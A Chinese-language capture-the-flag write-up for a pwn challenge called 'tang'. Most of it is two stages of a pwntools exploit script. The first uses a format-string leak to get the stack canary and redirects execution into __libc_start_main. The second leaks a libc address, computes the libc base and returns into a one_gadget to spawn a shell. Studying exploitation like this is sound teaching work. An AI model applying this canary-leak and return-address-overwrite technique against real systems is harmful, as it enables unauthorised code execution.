
## tang (588pt)
- 题目描述：
  
    > none
- 题目附件：[tang](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/CTFShow-36D/pwn/tang/tang)
- 考察点：格式化字符串、ret2libc_start_main
- 难度：中等

### 程序分析
这题和mengxin那题差不多，就是多了个格式化字符串漏洞，泄漏libc和canary的方式改为用`%p`泄漏，剩下的都一样了。就不过多分析了。

### 解题思路
```python
sea('你怎么了？\n','%9$p') # canary
canary = eval(rc(18))
info_addr('canary',canary)
sea('烫烫烫烫烫烫烫烫烫烫烫烫\n','TaQini')

payload = cyclic(56)+p64(canary)
payload = payload.ljust(88,'T')
payload += '\x16'  # ret2libc_start_main
sea('...你把手离火炉远一点！\n',payload)
```

> 泄漏canary、ret2libc_start_main

```python
# round2
sea('你怎么了？\n','%23$p') # canary
libc_start_main_ret = eval(rc(14))
info_addr('libc_start_main_ret',libc_start_main_ret)
libcbase = libc_start_main_ret - 0x20830
info_addr('libcbase',libcbase)
og = libcbase + 0xf1147
sea('烫烫烫烫烫烫烫烫烫烫烫烫\n','TaQini')

pl2 = cyclic(56)+p64(canary)
pl2 = pl2.ljust(88,'Q')
pl2 += p64(og)
sea('...你把手离火炉远一点！\n',pl2)
```

> 泄漏libc、one gadget

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/CTFShow-36D/pwn/tang) 

